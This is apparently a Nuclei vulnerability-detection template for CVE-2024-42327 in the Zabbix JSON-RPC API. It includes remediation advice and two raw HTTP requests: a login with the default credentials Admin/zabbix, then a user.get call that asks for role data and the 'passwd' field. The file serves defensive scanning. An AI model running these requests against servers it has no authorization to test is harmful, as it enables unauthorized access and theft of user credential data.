id: CVE-2024-42327

info:
  name: Zabbix JSON-RPC API Unauthorized Access
  author: ProjectDiscoveryAI
  severity: high
  description: |
    This template detects unauthorized access to sensitive user information 
    via the Zabbix JSON-RPC API, exploiting CVE-2024-42327. This vulnerability 
    allows attackers to retrieve user details without proper authorization.
  remediation: |
    To mitigate this vulnerability, ensure that your Zabbix server is updated 
    to the latest version where this issue is patched. Additionally, restrict 
    API access to trusted users and networks, and enforce strong authentication 
    mechanisms.
  tags: ZABBIX-监控系统

http:
  - raw:
      - |
        POST /api_jsonrpc.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json-rpc

        {
          "jsonrpc": "2.0",
          "method": "user.login",
          "params": {
            "username": "Admin",
            "password": "zabbix"
          },
          "id": 1
        }
    extractors:
      - type: json
        name: auth_token
        part: body
        internal: true
        json:
          - '.result'

  - raw:
      - |
        POST /api_jsonrpc.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json-rpc

        {
          "jsonrpc": "2.0",
          "method": "user.get",
          "params": {
            "selectRole": ["roleid", "passwd"],
            "userids": "1"
          },
          "auth": "{{auth_token}}",
          "id": 1
        }
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "username"
          - "roleid"
        condition: and
      - type: status
        status:
          - 200